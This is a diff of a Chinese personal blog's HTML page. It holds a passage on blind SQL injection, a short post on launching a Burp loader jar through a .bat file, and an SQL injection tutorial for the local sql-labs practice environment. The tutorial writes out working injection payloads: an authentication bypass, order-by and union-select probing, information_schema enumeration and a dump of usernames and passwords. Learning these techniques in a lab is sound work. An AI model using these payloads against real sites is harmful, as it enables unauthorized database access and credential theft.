+<p>可能有新的朋友早就发现了，手注的话真的是一年一道题，也看不到这里了吧，我不是坑各位，而是我真的被各种工具坑，等我学会了各种工具的详细用法再来写吧，况且其他大佬的博客都有用法，我个菜鸡还是先慢慢摸索工具吧，还有就是脚本，等我会写了以后多给大家一些脚本福利，本文只是盲注最简单的基础，遇到大部分题要记得随机应变，先找到网页回答你的yes或no的方法，再进行语句的注入，<br>比如给一个登录框你通过万能密码进入后提示flag再数据库中，这很正常，我们就可以吧是否登录成功作为yes或no来进行sal盲注<br>如<code>1&quot; or (lenth(database())&gt;1)--+</code>or后面直接跟盲注语句就好了，切记随机应变。<br><img src="https://img-blog.csdnimg.cn/20200310225326439.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
+      
+      <!-- 打赏 -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://shenmotai.github.io/2020/03/26/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%9B%B2%E6%B3%A8/" data-id="ck89qfgqz0000msvxbqhbh3ds"
+        class="article-share-link">分享</a>
+        
+      
+    </footer>
+
+  </div>
+
+  
+
+  
+  
+  
+
+  
+
+</article>
+    
+    <article id="post-java 之jar程序的打开" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/03/26/java%20%E4%B9%8Bjar%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%89%93%E5%BC%80/"
+    >java 之jar程序的打开</a
+  >
+</h2>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/03/26/java%20%E4%B9%8Bjar%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%89%93%E5%BC%80/" class="article-date">
+  <time datetime="2020-03-26T03:05:07.326Z" itemprop="datePublished">2020-03-26</time>
+</a>
+      
+      
+      
+      
+    </div>
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我在下载安装Burp Suite后遇到一个非常有意思的事，如图<br><img src="https://img-blog.csdnimg.cn/20200303100454526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这两个都无法运行，然后我借鉴了以前下载的Java工具使用方法，发现了一个非常有意思的操作。</p>
+<h1 id="开始操作了"><a href="#开始操作了" class="headerlink" title="开始操作了"></a>开始操作了</h1><p>在文件夹里创建一个文本<br>在里面输入：<code>java -jar Burploader.jar</code>(要启动的文件名)<br>如图<br><img src="https://img-blog.csdnimg.cn/20200303100131243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后修改文本后缀名为bat，举例：<code>ran.bat</code>。如图</p>
+<p><img src="https://img-blog.csdnimg.cn/20200303101149970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后双击<strong><em>.</em></strong>，你懂得</p>
+
+      
+      <!-- 打赏 -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://shenmotai.github.io/2020/03/26/java%20%E4%B9%8Bjar%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%89%93%E5%BC%80/" data-id="ck89qfgrn0003msvxcso0clmy"
+        class="article-share-link">分享</a>
+        
+      
+    </footer>
+
+  </div>
+
+  
+
+  
+  
+  
+
+  
+
+</article>
+    
+    <article id="post-简单的SQL注入" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/03/26/%E7%AE%80%E5%8D%95%E7%9A%84SQL%E6%B3%A8%E5%85%A5/"
+    >简单的SQL注入</a
+  >
+</h2>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/03/26/%E7%AE%80%E5%8D%95%E7%9A%84SQL%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2020-03-26T03:03:44.014Z" itemprop="datePublished">2020-03-26</time>
+</a>
+      
+      
+      
+      
+    </div>
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><h2 id="1、定义"><a href="#1、定义" class="headerlink" title="1、定义"></a>1、定义</h2><p>定义：SQL注入即是指web应用程序对用户输入数据的合法性没有判断，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
+<h2 id="2、基本方式"><a href="#2、基本方式" class="headerlink" title="2、基本方式"></a>2、基本方式</h2><p>sql注入可以绕过后台登录直接进入数据库，从而得到所需要的用户数据等重要数据，可以得到相关服务器密码进入服务器达到入侵的目的。</p>
+<h1 id="sql注入之万能密码"><a href="#sql注入之万能密码" class="headerlink" title="sql注入之万能密码"></a>sql注入之万能密码</h1><p>万能密码如下：</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user <span class="keyword">where</span> uname=<span class="number">1</span><span class="string">' or 1=1#</span></span><br></pre></td></tr></table></figure>
+<p>其中第一个<strong>1</strong>后面有个<strong>单引号</strong>，改符号为<strong>闭合符号</strong>，最后有一个     <strong>#</strong>号为<strong>注释符号</strong>。<br>其中需要<strong>注意</strong>的是<strong>闭合符号</strong>：<code>&#39;、&quot;、&#39;)、&quot;)。</code><br>常见的注释符号有：<code>#、--+、--空格。</code></p>
+<h1 id="联合注入查询"><a href="#联合注入查询" class="headerlink" title="联合注入查询"></a>联合注入查询</h1><p>需要用到<strong>sql-labs</strong>环境练习，可以百度搭建环境。</p>
+<h2 id="1、判断闭合符号"><a href="#1、判断闭合符号" class="headerlink" title="1、判断闭合符号"></a>1、判断闭合符号</h2><p>注意这里我们使用<code>--+</code>注释符号，不能使用<code>#</code>。<br><img src="https://img-blog.csdnimg.cn/20200301163525849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们在url框输入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=1</span><br></pre></td></tr></table></figure>
+<p>下面的数据会出现变化<br><img src="https://img-blog.csdnimg.cn/20200301163553829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这就是最普通的注入<br>可以在1右边加闭合符号，如果不对会出现如下报错。<br><img src="https://img-blog.csdnimg.cn/20200301163834261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="2、判断列数"><a href="#2、判断列数" class="headerlink" title="2、判断列数"></a>2、判断列数</h2><p>加上<code>order by 1--+</code>（1可以变换，数值越大列越多，试到报错为止）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=1<span class="string">' order by 1--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200301165517322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以判断出有3列</p>
+<h2 id="3、开始联合查询"><a href="#3、开始联合查询" class="headerlink" title="3、开始联合查询"></a>3、开始联合查询</h2><p>如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/Less-1/?id=0<span class="string">' union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200301165942728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>爆出数值2,3。即可在该位置插入所需语句进行下一步查询。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/Less-1/?id=0<span class="string">' union select 1,2,database()--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200301170237684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查询到所需数据表显示在3，位置。</p>
+<h2 id="4、爆数据表"><a href="#4、爆数据表" class="headerlink" title="4、爆数据表"></a>4、爆数据表</h2><p>知道了表名就可以爆出数据表的值了，hhhh。<br>首先数据表里面有一个大数据库<code>information_schema</code>，里面包含所有数据表。下面列出个语句作用：<br><code>group_concat</code>函数返回一个字符串结果，该结果由分组中的值连接组合而成。<br><code>table_name</code>表名<br><code>information_schema.tables</code>包含所有库的表名<br><code>table_schema</code>数据库名<br>整体代码如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=0<span class="string">' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='</span>security<span class="string">'--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20200301172731118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="5、爆字段"><a href="#5、爆字段" class="headerlink" title="5、爆字段"></a>5、爆字段</h2><p>新语句<br><code>information_schema.columns</code>包含所有表的字段<br><code>column_name</code>列名<br>爆位置2如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/Less-1/?id=0<span class="string">' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='</span>users<span class="string">'),3 --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20200301173246283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>也可以爆位置3</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/Less-1/?id=0<span class="string">' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='</span>users<span class="string">' --+</span></span><br></pre></td></tr></table></figure>
+<h2 id="6、爆值"><a href="#6、爆值" class="headerlink" title="6、爆值"></a>6、爆值</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/Less-1/?id=0<span class="string">' union select 1,group_concat(username,0x3a,password),3 from users --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200301174809517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>级得到我们需要的数据了，hhh。一到四关方法一致。</p>
+<h2 id="第二关无闭合符号"><a href="#第二关无闭合符号" class="headerlink" title="第二关无闭合符号"></a>第二关无闭合符号</h2><p><img src="https://img-blog.csdnimg.cn/20200301175313490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="第三关闭合符号为’"><a href="#第三关闭合符号为’" class="headerlink" title="第三关闭合符号为’)"></a>第三关闭合符号为’)</h2><p><img src="https://img-blog.csdnimg.cn/20200301180446198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="第四关闭合符号为”"><a href="#第四关闭合符号为”" class="headerlink" title="第四关闭合符号为”)"></a>第四关闭合符号为”)</h2><p><img src="https://img-blog.csdnimg.cn/20200301180044136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
+      
+      <!-- 打赏 -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://shenmotai.github.io/2020/03/26/%E7%AE%80%E5%8D%95%E7%9A%84SQL%E6%B3%A8%E5%85%A5/" data-id="ck89qfgro0004msvxhwyr0lce"
+        class="article-share-link">分享</a>
+        
+      
+    </footer>
+
+  </div>
+
+  
+
+  
+  
+  
+
+  
+
+</article>
+    
     <article id="post-使用hexo＋github搭建自己的博客" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
